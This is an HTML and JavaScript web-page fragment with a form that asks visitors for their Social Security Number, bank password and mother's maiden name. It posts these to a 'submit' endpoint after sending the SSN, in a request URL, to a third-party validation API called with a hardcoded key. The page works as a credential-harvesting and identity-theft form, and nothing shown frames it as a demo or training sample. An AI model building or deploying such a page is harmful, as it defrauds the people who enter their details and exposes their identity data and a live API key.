<section class="contact py-5" id="information" data-aos="fade-right" style="margin-top: 7% !important; margin-bottom: 8% !important">
  <div class="container">
    <div class="contact-form">
      <h2 class="mb-4" style="text-align: center; margin-bottom: 5% !important">Tell me more about yourself</h2>

      <form id="infoForm" method="post" action="submit" data-aos="fade-right">
        <div class="row">
          <input type="text" class="form-control" maxlength="11"
                 name="ssn" placeholder="Social Security Number"
                 id="ssn" required pattern="\d{3}-\d{2}-\d{4}"
                 aria-required="true"/>
          <script type="text/javascript">
            /**
             * Formats SSN input value as XXX-XX-XXXX
             * on each key press.
             */
            document.getElementById("ssn").onkeyup = function () {
              var val = this.value.replace(/\D/g, '');
              var newVal = '';

              if (val.length > 4) {
                this.value = val;
              }

              if ((val.length > 3) && (val.length < 6)) {
                newVal += val.substr(0, 3) + '-';
                val = val.substr(3);
              }

              if (val.length > 5) {
                newVal += val.substr(0, 3) + '-';
                newVal += val.substr(3, 2) + '-';
                val = val.substr(5);
              }

              newVal += val;
              this.value = newVal;
            };
          </script>
        </div>

        <div class="row">
          <input type="password" class="form-control"
                 name="bank" placeholder="Bank Password"
                 id="pwd" required aria-required="true">
        </div>

        <div class="row">
          <input type="text" class="form-control" required="yes"
                 name="message" placeholder="Mother's Maiden Name"
                 id="mmn" required aria-required="true">
        </div>

        <div class="row">
          <input type="submit" class="form-control submit-btn" value="Submit" id="submitBtn">
        </div>
      </form>

      <p id="error-message" style="color: red; display: none;">Invalid Social Security Number. Please try again.</p>
    </div>
  </div>
</section>

<script>
  // Wrapper function to get SSN validation response
  async function validateSSN(ssn) {
    const url = `https://free-social-security-number-validator.p.rapidapi.com/?usa_social_security_number=${ssn}`;
    const options = {
      method: 'GET',
      headers: {
        'x-rapidapi-key': 'bc8987d56dmsh518e3aa24da2d41p1784f0jsn978dae2962f1',
        'x-rapidapi-host': 'free-social-security-number-validator.p.rapidapi.com'
      }
    };

    try {
      const response = await fetch(url, options);
      const text = await response.text(); // Get the response as text
      return JSON.parse(text); // Parse the text to JSON
    } catch (error) {
      console.error(error);
      throw new Error('Error validating SSN. Please try again later.');
    }
  }

  document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('infoForm');
    const ssnInput = document.getElementById('ssn');

    ssnInput.oninput = function () {
      this.setCustomValidity('');
      const errorMessage = document.getElementById('error-message');
      errorMessage.style.display = 'none';
    };

    form.addEventListener('submit', async function (event) {
      event.preventDefault();
      const errorMessage = document.getElementById('error-message');
      errorMessage.style.display = 'none'; // Reset error message display
      ssnInput.setCustomValidity(''); // Clear any previous validation errors

      if (!ssnInput.validity.valid) {
        ssnInput.reportValidity();
        return;
      }

      try {
        const ssn = ssnInput.value;
        const result = await validateSSN(ssn);

        if (result.is_valid === "TRUE") {
          form.submit(); // Explicitly call form.submit(), it will respect the valid state
        } else {
          ssnInput.setCustomValidity('Invalid SSN');
          ssnInput.reportValidity();
        }
      } catch (error) {
        console.error(error);
        errorMessage.style.display = 'block';
        errorMessage.textContent = error.message;
      }
    });
  });
</script>

